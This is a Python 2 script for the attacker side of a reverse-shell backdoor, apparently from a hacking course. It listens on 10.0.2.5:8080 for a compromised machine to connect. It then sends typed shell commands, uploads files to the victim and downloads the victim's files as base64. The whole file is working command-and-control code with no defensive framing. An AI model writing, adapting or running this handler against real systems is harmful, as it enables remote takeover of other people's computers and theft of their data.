#!/usr/bin/python2
import base64
import socket
import json

class SocketListener:
    def __init__(self, ip, port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print("Listening...")
        (self.my_connection, adress) = my_listener.accept()
        print("Connection Successful to" + str(adress))
        print("'God is dead. God remains dead. And we have killed him.'")

    def json_send(self, data):
        json_data = json.dumps(data)
        self.my_connection.send(json_data)

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def command_exec(self, command_input):
        self.json_send(command_input)

        if command_input[0] == "exit":
            self.my_connection.close()
            exit()

        return self.json_receive()

    def write_download(self, path, content):
        with open(path, "wb") as write_file:
            write_file.write(base64.b64decode(content))
            return "download success to" + path

    def read_upload(self, path):
        with open(path, "rb") as upload_file:
            return base64.b64encode(upload_file.read())


    def listen_starter(self):
        while True:
            command_input = raw_input("Command?: ")
            command_input = command_input.split(" ")

            try:
                if command_input[0] == "upload":
                    file_content = self.read_upload(command_input[1])
                    command_input.append(file_content)

                command_output = self.command_exec(command_input)

                if command_input[0] == "download" and "Error!" not in command_output:
                    command_output = self.write_download(command_input[1], command_output)
            except Exception:
                command_output = "Error!"
            print(command_output)

my_socket_listener = SocketListener("10.0.2.5", 8080)
my_socket_listener.listen_starter()
